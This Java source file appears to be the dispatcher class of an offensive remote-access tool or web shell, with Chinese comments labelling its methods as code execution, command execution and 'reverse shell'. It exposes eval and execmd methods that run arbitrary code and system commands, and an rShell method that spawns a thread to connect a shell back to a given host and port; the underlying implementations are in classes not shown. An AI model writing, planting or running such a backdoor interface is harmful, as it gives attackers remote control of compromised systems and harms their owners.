package exec;

import exec.service.CallExec;
import exec.service.CallRshellThread;

/**
 * 命令调用中心
 */
public class Call {
    /**
     * 代码执行
     *
     * @param code
     * @return
     */
    public String eval(String code) {
        return new CallExec().eval(code);
    }

    /**
     * 命令执行
     *
     * @param cmd
     * @return
     */
    public String execmd(String cmd) {
        return new CallExec().execmd(cmd);
    }

    /**
     * 反弹shell
     *
     * @param host
     * @param port
     */
    public void rShell(String host, int port) {
        //return new CallExec().rShell(host, port);
        //多线程方式调用
        Thread t1 = new Thread(new CallRshellThread(host,port));
        t1.start();
    }
}
